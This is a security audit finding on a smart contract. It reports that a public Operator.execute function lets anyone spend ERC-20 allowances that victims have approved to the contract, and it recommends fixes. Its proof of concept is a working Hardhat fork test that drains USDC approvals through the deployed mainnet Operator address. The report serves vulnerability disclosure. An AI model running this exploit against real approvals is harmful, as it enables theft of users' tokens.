### Title
`Operator.execute` allows arbitrary callers to drain all ERC-20 tokens approved to `Operator` - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` executes attacker-controlled target addresses and calldata from the `Operator` contract without restricting callable functions, so any ERC-20 allowance granted by a victim to `Operator` can be spent through `transferFrom`. [1](#0-0) 

### Finding Description
`execute` stores the external caller in transient storage, iterates over arbitrary `Call` values, and invokes `target.functionCallWithValue(callData, value)`. [2](#0-1) [1](#0-0) 

`functionCallWithValue` ultimately performs `target.call{value: value}(data)`, meaning a token call observes `msg.sender == Operator`. [3](#0-2) 

Although `SynthContext` unwraps the actual caller for Metronome contracts, ordinary ERC-20 contracts do not implement `SynthContext` and will authenticate `Operator` as the spender. [4](#0-3) 

Therefore, once a victim approves `Operator` for a token, an attacker can call `execute` with `target = token` and `callData = transferFrom(victim, attacker, allowance)` to transfer the victim’s tokens. [1](#0-0) [5](#0-4) 

### Impact Explanation
The spender-authorization invariant is broken because a user’s approval to `Operator` can be consumed by any unrelated account rather than only while servicing that user’s requested action. [1](#0-0) 

This permits direct theft of every token balance covered by an outstanding allowance to deployed `Operator` instances. [5](#0-4) 

### Likelihood Explanation
The attack requires an outstanding victim allowance to `Operator`, but then any EOA can exploit it because `execute` is public and has no target, selector, owner-binding, or per-user authorization checks. [1](#0-0) 

The `nonReentrant` modifier only prevents nested `Operator.execute` calls and does not prevent a different account from using the victim’s existing allowance in a separate transaction. [6](#0-5) 

### Recommendation
Do not allow arbitrary calls to consume allowances granted to `Operator`; restrict `execute` to protocol-approved targets/selectors or require signed per-call authorization from the actual account whose assets are being spent. [1](#0-0) 

If `Operator` is intended to invoke only Synth contracts, remove its ability to call arbitrary external contracts and explicitly reject ERC-20 `transferFrom` calls. [4](#0-3) 

### Proof of Concept
The following Hardhat mainnet-fork test uses the deployed mainnet `Operator` at `0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360` and demonstrates that an attacker spends a victim’s outstanding USDC approval. [7](#0-6) 

```typescript
import {expect} from 'chai'
import {ethers} from 'hardhat'
import {parseUnits} from '@ethersproject/units'
import Address from '../helpers/address'
import {setTokenBalance, enableForking} from './helpers'
import {IOperator} from '../typechain/Operator'

describe('Operator allowance farming', function () {
  before(enableForking)

  it('lets anyone drain tokens approved to Operator', async function () {
    const [victim, attacker] = await ethers.getSigners()

    const operator = await ethers.getContractAt(
      'Operator',
      '0xc06D6347915f6B5e9dBB53Fe17B988b99DbaD360'
    )
    const usdc = await ethers.getContractAt('ERC20', Address.USDC_ADDRESS)

    const amount = parseUnits('100', 6)
    await setTokenBalance(usdc.address, victim.address, amount)
    await usdc.connect(victim).approve(operator.address, amount)

    const calls: IOperator.CallStruct[] = [
      {
        target: usdc.address,
        value: 0,
        callData: usdc.interface.encodeFunctionData('transferFrom', [
          victim.address,
          attacker.address,
          amount,
        ]),
      },
    ]

    await operator.connect(attacker).execute(calls)

    expect(await usdc.balanceOf(attacker.address)).eq(amount)
    expect(await usdc.balanceOf(victim.address)).eq(0)
  })
})
```
